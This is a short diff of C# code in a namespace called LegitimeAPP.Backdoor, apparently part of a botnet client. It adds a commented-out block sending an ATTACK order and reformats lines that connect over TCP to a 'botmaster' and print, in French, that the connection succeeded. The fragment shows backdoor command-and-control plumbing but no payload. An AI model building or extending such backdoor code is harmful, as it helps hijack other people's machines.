@@ -152,6 +152,12 @@ namespace LegitimeAPP.Backdoor {
 
         private void ListeningOrder() {
 
+
+            /*
+                    if (_attackInProgress) {
+                       WriteNetMessage(Data<Order>.DataToXml(new Order(TypeAction.ATTACK))) ;
+                    }
+*/
             while(true) {
 
                 try {
@@ -204,8 +210,8 @@ namespace LegitimeAPP.Backdoor {
 
 
                     stm = tcp.GetStream() ;
-                    WriteNetMessage("1") ; 
-                    Console.WriteLine("La connexion avec le botmaster est un succès") ; 
+                    WriteNetMessage("1") ;
+                    Console.WriteLine("La connexion avec le botmaster est un succès") ;
 
                 // On démarre le Thread lorsque la connexion est une réussite
 
